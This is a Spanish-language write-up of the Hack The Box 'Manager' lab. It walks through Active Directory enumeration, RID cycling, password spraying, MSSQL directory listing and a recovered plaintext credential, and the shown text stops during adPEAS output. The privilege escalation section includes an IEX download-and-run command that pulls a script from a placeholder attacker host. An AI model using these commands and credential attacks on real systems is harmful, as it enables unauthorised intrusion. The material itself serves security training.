---
tags:
  - Cybersecurity
  - eCPPT
  - Labs
  - HTB
  - Medium
  - AD
  - HTTP
  - RIDCycling
  - BruteForce
  - LateralMovement
  - SQLServer
  - SensitiveInformationDisclosure
  - ADCSAbuse
---
- [[#Enumeration|Enumeration]]
	- [[#Enumeration#System Enumeration|System Enumeration]]
	- [[#Enumeration#Port Enumeration|Port Enumeration]]
	- [[#Enumeration#HTTP|HTTP]]
		- [[#HTTP#Fuzzing Web|Fuzzing Web]]
	- [[#Enumeration#Active Directory Enumeration|Active Directory Enumeration]]
		- [[#Active Directory Enumeration#RID Cycling via Null Session|RID Cycling via Null Session]]
		- [[#Active Directory Enumeration#Users Validation|Users Validation]]
- [[#Exploitation|Exploitation]]
	- [[#Exploitation#Brute Force|Brute Force]]
		- [[#Brute Force#User Validation|User Validation]]
	- [[#Exploitation#Lateral Movement|Lateral Movement]]
		- [[#Lateral Movement#SQL Server|SQL Server]]
		- [[#Lateral Movement#Sensitive Information Disclosure|Sensitive Information Disclosure]]
- [[#Privilege Escalation|Privilege Escalation]]
	- [[#Privilege Escalation#Active Directory Enumeration|Active Directory Enumeration]]
	- [[#Privilege Escalation#ESC7: Abuse Permission on CA|ESC7: Abuse Permission on CA]]

---
# Manager

![](Screenshots/Pasted%20image%2020260523121143.png)

>Máquina de Hack The Box llamada [Manager](https://app.hackthebox.com/machines/Manager), centrada en enumeración Active Directory, abuso de MSSQL, extracción de credenciales desde archivos de respaldo y escalada de privilegios mediante AD CS ESC7. 
>La intrusión comienza con la enumeración de servicios Active Directory expuestos y la identificación de usuarios válidos mediante RID Cycling y sesiones nulas SMB.  
>Tras descubrir credenciales dentro de archivos de respaldo accesibles desde el servidor web, se obtiene acceso al sistema mediante WinRM como el usuario `Raven`.  
>Finalmente, se abusa de una configuración insegura de Active Directory Certificate Services (AD CS) mediante ESC7, permitiendo autenticación basada en certificados como `Administrator` y el compromiso total del dominio.

---
## Enumeration
### System Enumeration

```PowerShell
ping -c 1 10.129.2.41
PING 10.129.2.41 (10.129.2.41) 56(84) bytes of data.
64 bytes from 10.129.2.41: icmp_seq=1 ttl=127 time=50.6 ms

--- 10.129.2.41 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 50.556/50.556/50.556/0.000 ms
```

El `TTL=127` es característico de sistemas Windows (normalmente 128 - 1 salto), lo que nos permite saber el sistema operativo.
### Port Enumeration

```PowerShell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.2.41 -oG allPorts
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
1433/tcp  open  ms-sql-s         syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49693/tcp open  unknown          syn-ack ttl 127
49694/tcp open  unknown          syn-ack ttl 127
49695/tcp open  unknown          syn-ack ttl 127
49725/tcp open  unknown          syn-ack ttl 127
49800/tcp open  unknown          syn-ack ttl 127
49826/tcp open  unknown          syn-ack ttl 127
```

```PowerShell
PORT      STATE    SERVICE       VERSION
53/tcp    open     domain        Simple DNS Plus
80/tcp    open     http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Manager
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-23 17:16:25Z)
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-05-23T17:17:54+00:00; +6h59m56s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.manager.htb
| Not valid before: 2024-08-30T17:08:51
|_Not valid after:  2122-07-27T10:31:04
445/tcp   open     microsoft-ds?
464/tcp   open     kpasswd5?
593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-05-23T17:17:55+00:00; +6h59m56s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.manager.htb
| Not valid before: 2024-08-30T17:08:51
|_Not valid after:  2122-07-27T10:31:04
1433/tcp  open     ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2026-05-23T17:17:54+00:00; +6h59m56s from scanner time.
| ms-sql-info: 
|   10.129.2.41:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-05-23T17:06:25
|_Not valid after:  2056-05-23T17:06:25
| ms-sql-ntlm-info: 
|   10.129.2.41:1433: 
|     Target_Name: MANAGER
|     NetBIOS_Domain_Name: MANAGER
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: manager.htb
|     DNS_Computer_Name: dc01.manager.htb
|     DNS_Tree_Name: manager.htb
|_    Product_Version: 10.0.17763
3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.manager.htb
| Not valid before: 2024-08-30T17:08:51
|_Not valid after:  2122-07-27T10:31:04
|_ssl-date: 2026-05-23T17:17:54+00:00; +6h59m56s from scanner time.
3269/tcp  open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.manager.htb
| Not valid before: 2024-08-30T17:08:51
|_Not valid after:  2122-07-27T10:31:04
|_ssl-date: 2026-05-23T17:17:55+00:00; +6h59m56s from scanner time.
5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open     mc-nmf        .NET Message Framing
49667/tcp open     msrpc         Microsoft Windows RPC
49693/tcp open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
49694/tcp open     msrpc         Microsoft Windows RPC
49695/tcp open     msrpc         Microsoft Windows RPC
49725/tcp open     msrpc         Microsoft Windows RPC
49800/tcp open     msrpc         Microsoft Windows RPC
49826/tcp filtered unknown
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

```PowerShell
crackmapexec smb 10.129.2.41
SMB         10.129.2.41     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
```

Se añade al archivo `/etc/hosts` el dominio: `10.129.2.41 manager.htb dc01.manager.htb`.

LDAP + Kerberos + SMB → _Domain Controler_

- Dominio: `manager.htb`
- Host: `DC01`
- OS: `Windows 10 / Server 2019 Build 17763 x64`
### HTTP

```HTTP
http://10.129.2.41/
```

![](Screenshots/Pasted%20image%2020260523125357.png)
#### Fuzzing Web

```PowerShell
gobuster dir -u http://10.129.2.41/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 64
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
images               (Status: 301) [Size: 149] [--> http://10.129.2.41/images/]
css                  (Status: 301) [Size: 146] [--> http://10.129.2.41/css/]
js                   (Status: 301) [Size: 145] [--> http://10.129.2.41/js/]
Progress: 207641 / 207641 (100.00%)
===============================================================
Finished
===============================================================

dirb http://10.129.2.41/
---- Scanning URL: http://10.129.2.41/ ----
==> DIRECTORY: http://10.129.2.41/css/                                                                                                                                                                                                     
==> DIRECTORY: http://10.129.2.41/images/                                                                                                                                                                                                  
==> DIRECTORY: http://10.129.2.41/Images/                                                                                                                                                                                                  
+ http://10.129.2.41/index.html (CODE:200|SIZE:18203)                                                                                                                                                                                      
==> DIRECTORY: http://10.129.2.41/js/                                                                                                                                                                                                      
---- Entering directory: http://10.129.2.41/css/ ----
---- Entering directory: http://10.129.2.41/images/ ----
---- Entering directory: http://10.129.2.41/Images/ ----
---- Entering directory: http://10.129.2.41/js/ ----
```
### Active Directory Enumeration

```PowerShell
crackmapexec smb 10.129.2.41 --shares
SMB         10.129.2.41     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.129.2.41     445    DC01             [-] Error enumerating shares: STATUS_USER_SESSION_DELETED

smbclient -L 10.129.2.41 -N
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.2.41 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

smbmap -H 10.129.2.41 -u 'Guest'
[+] IP: 10.129.2.41:445 Name: manager.htb               Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        SYSVOL                                                  NO ACCESS       Logon server share 

smbclient //10.129.2.41/IPC$ -U 'Guest'
smb: \> ls
NT_STATUS_NO_SUCH_FILE listing \*

rpcclient -U "" 10.129.2.41
rpcclient $> querydominfo
result was NT_STATUS_ACCESS_DENIED
```

No obtenemos nada de información.
#### RID Cycling via Null Session

El **RID Cycling** consiste en enumerar identificadores relativos (RID) asociados a cuentas del dominio, permitiendo descubrir usuarios válidos sin necesidad de autenticación.

```PowerShell
impacket-lookupsid 'manager.htb/guest'@manager.htb -no-pass
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Brute forcing SIDs at manager.htb
[*] StringBinding ncacn_np:manager.htb[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-4078382237-1492182817-2568127209
498: MANAGER\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: MANAGER\Administrator (SidTypeUser)
501: MANAGER\Guest (SidTypeUser)
502: MANAGER\krbtgt (SidTypeUser)
512: MANAGER\Domain Admins (SidTypeGroup)
513: MANAGER\Domain Users (SidTypeGroup)
514: MANAGER\Domain Guests (SidTypeGroup)
515: MANAGER\Domain Computers (SidTypeGroup)
516: MANAGER\Domain Controllers (SidTypeGroup)
517: MANAGER\Cert Publishers (SidTypeAlias)
518: MANAGER\Schema Admins (SidTypeGroup)
519: MANAGER\Enterprise Admins (SidTypeGroup)
520: MANAGER\Group Policy Creator Owners (SidTypeGroup)
521: MANAGER\Read-only Domain Controllers (SidTypeGroup)
522: MANAGER\Cloneable Domain Controllers (SidTypeGroup)
525: MANAGER\Protected Users (SidTypeGroup)
526: MANAGER\Key Admins (SidTypeGroup)
527: MANAGER\Enterprise Key Admins (SidTypeGroup)
553: MANAGER\RAS and IAS Servers (SidTypeAlias)
571: MANAGER\Allowed RODC Password Replication Group (SidTypeAlias)
572: MANAGER\Denied RODC Password Replication Group (SidTypeAlias)
1000: MANAGER\DC01$ (SidTypeUser)
1101: MANAGER\DnsAdmins (SidTypeAlias)
1102: MANAGER\DnsUpdateProxy (SidTypeGroup)
1103: MANAGER\SQLServer2005SQLBrowserUser$DC01 (SidTypeAlias)
1113: MANAGER\Zhong (SidTypeUser)
1114: MANAGER\Cheng (SidTypeUser)
1115: MANAGER\Ryan (SidTypeUser)
1116: MANAGER\Raven (SidTypeUser)
1117: MANAGER\JinWoo (SidTypeUser)
1118: MANAGER\ChinHae (SidTypeUser)
1119: MANAGER\Operator (SidTypeUser)

# Solo nos interesan los usuarios (SidTypeUser)
impacket-lookupsid 'manager.htb/guest'@manager.htb -no-pass | grep "SidTypeUser" 
500: MANAGER\Administrator (SidTypeUser)
501: MANAGER\Guest (SidTypeUser)
502: MANAGER\krbtgt (SidTypeUser)
1000: MANAGER\DC01$ (SidTypeUser)
1113: MANAGER\Zhong (SidTypeUser)
1114: MANAGER\Cheng (SidTypeUser)
1115: MANAGER\Ryan (SidTypeUser)
1116: MANAGER\Raven (SidTypeUser)
1117: MANAGER\JinWoo (SidTypeUser)
1118: MANAGER\ChinHae (SidTypeUser)
1119: MANAGER\Operator (SidTypeUser)
```

Se procesan los resultados para obtener listas limpias:

```powershell
cat users | awk '{print $2}' | tr '\\' ' ' | awk '{print $2}' | sponge users
```
#### Users Validation

```PowerShell
kerbrute userenum --dc 10.129.2.41 -d manager.htb users
2026/05/23 13:21:55 >  [+] VALID USERNAME:       Zhong@manager.htb
2026/05/23 13:21:55 >  [+] VALID USERNAME:       DC01$@manager.htb
2026/05/23 13:21:55 >  [+] VALID USERNAME:       Guest@manager.htb
2026/05/23 13:21:55 >  [+] VALID USERNAME:       Raven@manager.htb
2026/05/23 13:21:55 >  [+] VALID USERNAME:       ChinHae@manager.htb
2026/05/23 13:21:55 >  [+] VALID USERNAME:       Cheng@manager.htb
2026/05/23 13:21:55 >  [+] VALID USERNAME:       Administrator@manager.htb
2026/05/23 13:21:55 >  [+] VALID USERNAME:       Ryan@manager.htb
2026/05/23 13:21:55 >  [+] VALID USERNAME:       JinWoo@manager.htb
2026/05/23 13:21:55 >  [+] VALID USERNAME:       Operator@manager.htb
```

Se prueba a realizar un ataque **AS-REP Roasting**.

```PowerShell
impacket-GetNPUsers manager.htb/ -usersfile users -no-pass
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User DC01$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Zhong doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Cheng doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Ryan doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Raven doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User JinWoo doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ChinHae doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Operator doesn't have UF_DONT_REQUIRE_PREAUTH set
```

No es posible.

---
## Exploitation
### Brute Force

```PowerShell
crackmapexec smb 10.129.2.41 -u /home/m4num0re/Escritorio/Labs/HackTheBox/Manager/users -p /home/m4num0re/Escritorio/Labs/HackTheBox/Manager/users --no-brute --continue-on-success
SMB         10.129.2.41     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.129.2.41     445    DC01             [-] manager.htb\administrator:administrator STATUS_LOGON_FAILURE 
SMB         10.129.2.41     445    DC01             [-] manager.htb\guest:guest STATUS_LOGON_FAILURE 
SMB         10.129.2.41     445    DC01             [-] manager.htb\krbtgt:krbtgt STATUS_LOGON_FAILURE 
SMB         10.129.2.41     445    DC01             [-] manager.htb\DC01$:DC01$ STATUS_LOGON_FAILURE 
SMB         10.129.2.41     445    DC01             [-] manager.htb\zhong:zhong STATUS_LOGON_FAILURE 
SMB         10.129.2.41     445    DC01             [-] manager.htb\cheng:cheng STATUS_LOGON_FAILURE 
SMB         10.129.2.41     445    DC01             [-] manager.htb\ryan:ryan STATUS_LOGON_FAILURE 
SMB         10.129.2.41     445    DC01             [-] manager.htb\raven:raven STATUS_LOGON_FAILURE 
SMB         10.129.2.41     445    DC01             [-] manager.htb\jinwoo:jinwoo STATUS_LOGON_FAILURE 
SMB         10.129.2.41     445    DC01             [-] manager.htb\chinhae:chinhae STATUS_LOGON_FAILURE 
SMB         10.129.2.41     445    DC01             [+] manager.htb\operator:operator
```

Se obtiene las credenciales: `operator:operator`.
#### User Validation

```PowerShell
crackmapexec smb 10.129.2.41 -u 'operator' -p 'operator'
SMB         10.129.2.41     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.129.2.41     445    DC01             [+] manager.htb\operator:operator 
```

```PowerShell
crackmapexec winrm 10.129.2.41 -u 'operator' -p 'operator'
SMB         10.129.2.41     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:manager.htb)
HTTP        10.129.2.41     5985   DC01             [*] http://10.129.2.41:5985/wsman
WINRM       10.129.2.41     5985   DC01             [-] manager.htb\operator:operator
```
### Lateral Movement

Se prueba a ver si algún usuario tiene deshabilitada la preautenticación Kerberos.

```PowerShell
impacket-GetNPUsers 'manager.htb/operator:operator'
No entries found!
```

Se realiza una enumeración de directorios compartidos.

```PowerShell
crackmapexec smb 10.129.2.41 -u 'operator' -p 'operator' --shares
SMB         10.129.2.41     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.129.2.41     445    DC01             [+] manager.htb\operator:operator 
SMB         10.129.2.41     445    DC01             [+] Enumerated shares
SMB         10.129.2.41     445    DC01             Share           Permissions     Remark
SMB         10.129.2.41     445    DC01             -----           -----------     ------
SMB         10.129.2.41     445    DC01             ADMIN$                          Remote Admin
SMB         10.129.2.41     445    DC01             C$                              Default share
SMB         10.129.2.41     445    DC01             IPC$            READ            Remote IPC
SMB         10.129.2.41     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.2.41     445    DC01             SYSVOL          READ            Logon server share
```

Se analiza, pero no se encuentra nada.

Se enumeran usuarios, grupos ...

```PowerShell
rpcclient -U 'operator%operator' 10.129.2.41
rpcclient $> querydominfo
Domain:         MANAGER
Server:
Comment:
Total Users:    45
Total Groups:   0
Total Aliases:  15
Sequence No:    1
Force Logoff:   18446744073709551615
Domain Server State:    0x1
Server Role:    ROLE_DOMAIN_PDC
Unknown 3:      0x1

rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[Zhong] rid:[0x459]
user:[Cheng] rid:[0x45a]
user:[Ryan] rid:[0x45b]
user:[Raven] rid:[0x45c]
user:[JinWoo] rid:[0x45d]
user:[ChinHae] rid:[0x45e]
user:[Operator] rid:[0x45f]

rpcclient $> querydispinfo
index: 0xeda RID: 0x1f4 acb: 0x00004210 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain
index: 0xfeb RID: 0x45a acb: 0x00000210 Account: Cheng  Name: (null)    Desc: (null)
index: 0xfef RID: 0x45e acb: 0x00000210 Account: ChinHae        Name: (null)    Desc: (null)
index: 0xedb RID: 0x1f5 acb: 0x00000214 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0xfee RID: 0x45d acb: 0x00000210 Account: JinWoo Name: (null)    Desc: (null)
index: 0xf0f RID: 0x1f6 acb: 0x00020011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
index: 0xff0 RID: 0x45f acb: 0x00000210 Account: Operator       Name: (null)    Desc: (null)
index: 0xfed RID: 0x45c acb: 0x00000210 Account: Raven  Name: (null)    Desc: (null)
index: 0xfec RID: 0x45b acb: 0x00000210 Account: Ryan   Name: (null)    Desc: (null)
index: 0xfea RID: 0x459 acb: 0x00000210 Account: Zhong  Name: (null)    Desc: (null)

rpcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]

rpcclient $> querygroupmem 0x200
        rid:[0x1f4] attr:[0x7]
```
#### SQL Server

Nos conectamos a la **BBDD**.

```PowerShell
impacket-mssqlclient manager.htb/operator:operator@10.129.2.41 -windows-auth
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
[!] Press help for extra shell commands
SQL (MANAGER\Operator  guest@master)> 

# Se prueba a ejecutar comandos
SQL (MANAGER\Operator  guest@master)> xp_cmdshell "whoami"
ERROR(DC01\SQLEXPRESS): Line 1: The EXECUTE permission was denied on the object 'xp_cmdshell', database 'mssqlsystemresource', schema 'sys'.


# Se prueba a habilitar el xp_cmdshell
QL (MANAGER\Operator  guest@master)> enable_xp_cmdshell
ERROR(DC01\SQLEXPRESS): Line 105: User does not have permission to perform this action.
ERROR(DC01\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement.
ERROR(DC01\SQLEXPRESS): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
ERROR(DC01\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement.

# Enumerar BBDD
SQL (MANAGER\Operator  guest@master)> enum_db
name     is_trustworthy_on   
------   -----------------   
master                   0   
tempdb                   0   
model                    0   
msdb                     1

# Enumerar usuarios
SQL (MANAGER\Operator  guest@master)> enum_users
UserName             RoleName   LoginName   DefDBName   DefSchemaName       UserID     SID   
------------------   --------   ---------   ---------   -------------   ----------   -----   
dbo                  db_owner   sa          master      dbo             b'1         '   b'01'   
guest                public     NULL        NULL        guest           b'2         '   b'00'   
INFORMATION_SCHEMA   public     NULL        NULL        NULL            b'3         '    NULL   
sys                  public     NULL        NULL        NULL            b'4         '    NULL

# Enumerar directorios del sistema
SQL (MANAGER\Operator  guest@master)> xp_dirtree
subdirectory                depth   file   
-------------------------   -----   ----   
$Recycle.Bin                    1      0   
Documents and Settings          1      0   
inetpub                         1      0   
PerfLogs                        1      0   
Program Files                   1      0   
Program Files (x86)             1      0   
ProgramData                     1      0   
Recovery                        1      0   
SQL2019                         1      0   
System Volume Information       1      0   
Users                           1      0   
Windows                         1      0

SQL (MANAGER\Operator  guest@master)> xp_dirtree C:\inetpub
subdirectory   depth   file   
------------   -----   ----   
custerr            1      0   
history            1      0   
logs               1      0   
temp               1      0   
wwwroot            1      0

QL (MANAGER\Operator  guest@master)> xp_dirtree C:\inetpub\wwwroot
subdirectory                      depth   file   
-------------------------------   -----   ----   
about.html                            1      1   
contact.html                          1      1   
css                                   1      0   
images                                1      0   
index.html                            1      1   
js                                    1      0   
service.html                          1      1   
web.config                            1      1   
website-backup-27-07-23-old.zip       1      1
```

Se encuentra en el directorio de la web, un archivo comprimido llamado `website-backup-27-07-23-old.zip`.
#### Sensitive Information Disclosure

Se descarga el comprimido.

```HTTP
http://10.129.2.41/website-backup-27-07-23-old.zip
```

Se descomprime.

```PowerShell
unzip -l website-backup-27-07-23-old.zip
Archive:  website-backup-27-07-23-old.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
      698  2023-07-27 05:35   .old-conf.xml
     5386  2023-07-27 05:32   about.html
     5317  2023-07-27 05:32   contact.html
   192348  2019-02-13 11:17   css/bootstrap.css
     1389  2019-11-21 09:17   css/responsive.css
    11838  2020-04-29 04:43   css/style.css
     9988  2020-04-29 04:43   css/style.css.map
    10931  2020-04-29 04:43   css/style.scss
   311015  2019-11-21 05:11   images/about-img.png
   106689  2019-11-21 08:40   images/body_bg.jpg
     1156  2019-11-21 07:23   images/call.png
     1518  2019-11-21 07:24   images/call-o.png
    29975  2019-11-21 06:27   images/client.jpg
    31118  2019-11-21 06:03   images/contact-img.jpg
      698  2019-11-21 07:23   images/envelope.png
      890  2019-11-21 07:24   images/envelope-o.png
   430342  2019-11-21 04:08   images/hero-bg.jpg
      601  2019-11-21 07:23   images/location.png
      777  2019-11-21 07:24   images/location-o.png
     2160  2019-11-21 04:13   images/logo.png
     9825  2019-11-08 09:32   images/menu.png
      177  2019-11-20 03:58   images/next.png
      265  2019-11-20 03:59   images/next-white.png
    45140  2019-11-20 06:43   images/offer-img.jpg
      183  2019-11-20 03:58   images/prev.png
      260  2019-11-20 03:59   images/prev-white.png
      447  2019-11-20 08:44   images/quote.png
      914  2019-11-21 05:30   images/s-1.png
      742  2019-11-21 05:30   images/s-2.png
     1373  2019-11-21 05:30   images/s-3.png
     1388  2019-11-21 05:30   images/s-4.png
      517  2019-11-21 05:00   images/search-icon.png
    18203  2023-07-27 05:32   index.html
   131863  2020-04-29 09:00   js/bootstrap.js
    88145  2019-08-01 07:03   js/jquery-3.4.1.min.js
     7900  2023-07-27 05:32   service.html
---------                     -------
  1462176                     36 files
  
unzip website-backup-27-07-23-old.zip

cat .old-conf.xml
<?xml version="1.0" encoding="UTF-8"?>
<ldap-conf xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
   <server>
      <host>dc01.manager.htb</host>
      <open-port enabled="true">389</open-port>
      <secure-port enabled="false">0</secure-port>
      <search-base>dc=manager,dc=htb</search-base>
      <server-type>microsoft</server-type>
      <access-user>
         <user>raven@manager.htb</user>
         <password>R4v3nBe5tD3veloP3r!123</password>
      </access-user>
      <uid-attribute>cn</uid-attribute>
   </server>
   <search type="full">
      <dir-list>
         <dir>cn=Operator1,CN=users,dc=manager,dc=htb</dir>
      </dir-list>
   </search>
</ldap-conf>
```

Se encuentra las credenciales: `raven:R4v3nBe5tD3veloP3r!123`.

Se comprueba las credenciales para `SMB` y `WinRM`.

```PowerShell
crackmapexec smb 10.129.2.41 -u 'raven' -p 'R4v3nBe5tD3veloP3r!123'
SMB         10.129.2.41     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.129.2.41     445    DC01             [+] manager.htb\raven:R4v3nBe5tD3veloP3r!123

crackmapexec winrm 10.129.2.41 -u 'raven' -p 'R4v3nBe5tD3veloP3r!123'
SMB         10.129.2.41     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:manager.htb)
HTTP        10.129.2.41     5985   DC01             [*] http://10.129.2.41:5985/wsman
WINRM       10.129.2.41     5985   DC01             [+] manager.htb\raven:R4v3nBe5tD3veloP3r!123 (Pwn3d!)
```

La flag de `usuario` se encuentra en: `C:\Users\Raven\Desktop`.

---
## Privilege Escalation
### Active Directory Enumeration

Se utiliza [adPEAS](https://github.com/61106960/adPEAS.git), para enumerar el *Active Directory*.

Máquina atacante:

```PowerShell
https://github.com/61106960/adPEAS.git
cd adPEAS
python3 -m http.server 80
```

Máquina victima:

```PowerShell
IEX(New-Object Net.WebClient).downloadString('http://[ATTACKER_IP]/adPEAS.ps1');

Invoke-adPEAS -Domain 'manager.htb' -Username 'raven' -Password 'R4v3nBe5tD3veloP3r!123'
======================================================================
+++++ Using existing LDAP connection +++++
======================================================================
Connected to domain 'manager.htb' on server 'dc01.manager.htb' as 'manager.htb\raven' via LDAP
Executing Modules: Domain, Creds, Rights, Delegation, ADCS, Accounts, GPO, Computer, Application, Bloodhound


======================================================================
+++++ [1/10] Analyzing Domain Configuration +++++
======================================================================

[?] Collecting domain information...
[*] Found domain information:
domainNameDNS:                               manager.htb
domainNameNetBIOS:                           manager
domainSID:                                   S-1-5-21-4078382237-1492182817-2568127209
domainFunctionalLevel:                       Windows 2016
forestFunctionalLevel:                       Windows 2016
forestName:                                  manager.htb


[?] Analyzing Kerberos policy...
[!] Found Kerberos policy:
maxTicketAgeTGT:                             10 hours (default)
maxRenewalAge:                               7 days (default)
[!] krbtgtPasswordAge:                       1032 days (last changed: 2023-07-27)
domainControllerTime:                        2026-05-24 23:48:16 UTC (skew: +0s)


[?] Checking Guest Account Status...
[+] Found enabled Guest account
[+] accountStatus:                           ENABLED
memberOf:                                    Guests


[?] Searching for Domain Controllers...
[*] Found 1 domain controller(s):
domainControllers:                           dc01.manager.htb [PDC Emulator, Schema Master, Infrastructure Master, Domain Naming Master, RID Master]


[?] Searching for Sites and Subnets...                                                                                                                                                                                                      
[*] Found 1 site(s) and 0 subnet(s):
siteName:                                    Default-First-Site-Name
siteSubnets:                                 (none)
siteDomainControllers:                       dc01.manager.htb


[?] Analyzing password policy...                                                                                                                                                                                                            
[!] Found password policy:
[!] minPwdLength:                            7 characters
[!] passwordComplexity:                      Disabled
minPwdAge:                                   1 days
maxPwdAge:                                   42 days
reversibleEncryption:                        Disabled
[!] lockoutThreshold:                        Disabled
lockoutDuration:                             30 minutes
lockoutObservationWindow:                    30 minutes


[?] Checking for Fine-Grained Password Policies (FGPP)...                                                                                                                                                                                   
